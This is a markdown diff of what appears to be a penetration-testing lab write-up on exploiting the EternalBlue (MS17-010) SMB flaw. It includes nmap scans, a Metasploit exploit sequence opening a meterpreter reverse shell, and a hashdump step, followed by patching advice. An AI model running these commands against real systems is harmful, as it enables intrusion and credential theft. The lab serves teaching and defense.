@@ -58,19 +58,22 @@ nmap -sC -sV -p 445 192.168.1.32
 
 # Full port scan
 nmap -p- -T4 192.168.1.32
-2️⃣ Vulnerability Discovery
+```
+
+### 2️⃣ Vulnerability Discovery
 Confirming the presence of the EternalBlue vulnerability:
 
-Bash
-
+```bash
 nmap --script smb-vuln-ms17-010 -p 445 192.168.1.32
+```
 ✔️ Target confirmed vulnerable to MS17-010.
 
-3️⃣ Exploitation
+
+### 3️⃣ Exploitation
 Launching the attack using Metasploit:
 
 مقتطف الرمز
-
+```msf
 msfconsole
 search ms17-010
 use exploit/windows/smb/ms17_010_eternalblue
@@ -78,9 +81,10 @@ set RHOSTS 192.168.1.32
 set LHOST <Your_IP>
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 exploit
+```
 ✔️ Meterpreter session opened with SYSTEM privileges.
 
-4️⃣ Post-Exploitation
+### 4️⃣ Post-Exploitation
 Demonstrating full system control and credential theft:
 
 مقتطف الرمز
@@ -101,7 +105,7 @@ hashdump
 
 [x] Full system compromise demonstrated.
 
-🔐 Security Recommendations
+### 🔐 Security Recommendations
 Apply Patches: Install the MS17-010 security update.
 
 Disable SMBv1: Disable the outdated SMBv1 protocol.
@@ -117,7 +121,8 @@ Traffic Monitoring: Monitor for suspicious SMB traffic and RCE attempts.
 
 💥 Metasploit EternalBlue Module
 
-👤 Author
-Abanoub Ehab | BobXploit Cybersecurity & Penetration Testing
-
+### 👤 Author
+## Abanoub Ehab | BobXploit Cybersecurity & Penetration Testing
+##
 Disclaimer: This lab is for educational purposes only. Unauthorized exploitation of computer systems is illegal and unethical.
+---
